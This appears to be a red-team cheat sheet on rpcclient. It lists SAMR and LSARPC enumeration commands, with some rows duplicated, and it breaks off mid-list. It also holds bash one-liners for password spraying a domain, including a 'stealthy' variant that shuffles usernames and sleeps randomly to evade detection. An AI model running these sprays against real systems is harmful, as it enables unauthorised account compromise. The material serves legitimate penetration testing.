<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# rpcclient
## Installation
* `apt install smbclient` to install rpcclient.

## Command Options

|Command|RPC Pipe|Output|
|:-:|:-:|:-:|
| `queryuser` |SAMR|Retrieve User Information|
| `querygroup` |SAMR|Retrieve Group Information|
| `queryuser` |SAMR|Retrieve User Information|
| `queryuser` |SAMR|Retrieve user information.
| `querygroup` |SAMR|Retrieve group information.
| `querydominfo` |SAMR|Retrieve domain information.
| `enumdomusers` |SAMR|Enumerate domain users.
| `enumdomgroups` |SAMR|Enumerate domain groups.
| `createdomuser` |SAMR|Create a domain user.
| `deletedomuser` |SAMR|Delete a domain user.
| `lookupnames` |LSARPC|Look up usernames to SID values.
| `lookupsids` |LSARPC|Look up SIDs to usernames (RID cycling).
| `lsaaddacctrights` |LSARPC|Add rights to a user account.
| `lsaremoveacctrights` |LSARPC|Remove rights from a user account.
| `dsroledominfo` |LSARPC-DS|Get primary domain information.
| `dsenumdomtrusts` |LSARPC-DS|Enumerate trusted domains within an AD forest

## Examples
* Example 1

		for user in $(cat users.txt); do password=Password1; echo -n "$user:$password:" && rpcclient -U "$user%$password" -c "getusername;quit" evilcorp.local; done | tee -a spray.log | grep -vi failure
	* NOTE: This sometimes reports "`NT_STATUS_LOGON_FAILURE`" even with a correct password!
* Example 2: More stealthy (shuffles usernames & sleeps randomly)

		for user in $(cat users.txt | shuf); do password=Password1; echo -n "$user:$password:" && rpcclient -U "$user%$password" -c "getusername;quit" evilcorp.local; sleep $(($RANDOM % 10)); done


* Execute commands

		rpcclient -c 'command' <target>
	* `-U`
* Options
	* <details><summary>rpcclient (Click to expand)</summary><p>`lsaquery`: get domain name and SID (Security IDentifier)

			root@kali:/# rpcclient -c 'lsaquery' 10.0.0.1 -U securelab/domain_user
			Enter SECURELAB\domain_user's password: 
			Domain Name: SECURELAB
			Domain Sid: S-1-5-21-1850020582-442782152-1341288763